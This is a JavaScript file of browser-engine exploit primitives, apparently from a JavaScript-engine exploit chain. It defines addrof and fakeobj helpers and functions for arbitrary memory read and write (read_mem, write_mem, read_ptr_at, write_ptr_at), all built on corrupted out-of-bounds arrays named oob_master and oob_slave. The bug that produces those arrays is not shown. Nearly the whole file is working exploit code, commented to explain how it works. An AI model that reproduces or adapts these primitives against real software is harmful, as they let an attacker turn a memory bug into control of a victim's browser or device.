//
// ...
function i48_put(x, a) {
  a[4] = x;              // lower 32 bits of <x>
  a[5] = x / 4294967296; // upper 32 bits of <x>
}

//
// ...
function i48_get(a) {
  return a[4] + a[5] * 4294967296;
}

//
// addrof primitive
function addrof(x) {
  leaker_obj.a = x;
  return i48_get(leaker_arr);
}

//
// fakeobj primitive 
function fakeobj(x) {
  i48_put(x, leaker_arr);
  return leaker_obj.a;
}

//
// Function used to set up memory for arbitrary read 
// operation.

function read_mem_setup(p, sz) {
  i48_put(p, oob_master);
  oob_master[6] = sz;
}

//
// Function used for reading (sz) bytes from oob_slave.
// AKA, used for (arbitrary) read of memory.
//
// Summary: The function will read (sz) number of bytes 
// from the oob_slave (out-of-bounds slave) array, then
// the read data will be returned as an array.

function read_mem(p, sz) {
  read_mem_setup(p, sz);
  var arr = [];
  for (var i = 0; i < sz; i++) 
    arr.push(oob_slave[i]);
  return arr;
}

//
// Function used for returning contents of the oob_slave 
// out-of-bounds slave array in the form of an string

function read_mem_s(p, sz) {
  read_mem_setup(p, sz);
  return "" + oob_slave;
}

//
// Function used to read the value given by (sz) number of
// bytes from the oob_slave out-of-bounds slave array, and
// create a new Uint8Array (8-bit unsigned integer array)
// with the data read, before returning it.

function read_mem_b(p, sz) {
  read_mem_setup(p, sz);
  var b = new Uint8Array(sz);
  b.set(oob_slave);
  return b;
}

//
// Function used to read (sz) bytes from (p), then convert
// the data into it's ascii/plaintext human readable form,
// and finally returning the converted string

function read_mem_as_string(p, sz) {
  var x = read_mem_b(p, sz);
  var ans = "";
  for (var i = 0; i < x.length; i++) {
    ans += String.fromCharCode(x[i]);
  }
  return ans;
}
//
// Writes the contents of (data) to the out-of-bounds
// slave array (oob_slave), allowing arbitrary writing
// of memory.

function write_mem(p, data) {
  i48_put(p, oob_master);
  oob_master[6] = data.length;

  for (var i = 0; i < data.length; i++) 
    oob_slave[i] = data[i];
}

//
// ... 

function read_ptr_at(p) {
  var ans = 0;
  var d = read_mem(p, 8);
  for (var i = 7; i >= 0; i--) ans = 256 * ans + d[i];
  return ans;
}

//
// ... 

function write_ptr_at(p, d) {
  var arr = [];
  for (var i = 0; i < 8; i++) {
    arr.push(d & 0xff);
    d /= 256;
  }
  write_mem(p, arr);
}

//
// Converts a regular number to its 16-bit hexadecimal 
// representation, before returning it.

function num_to_hex(num) {
  return Number(num).toString(16);
}
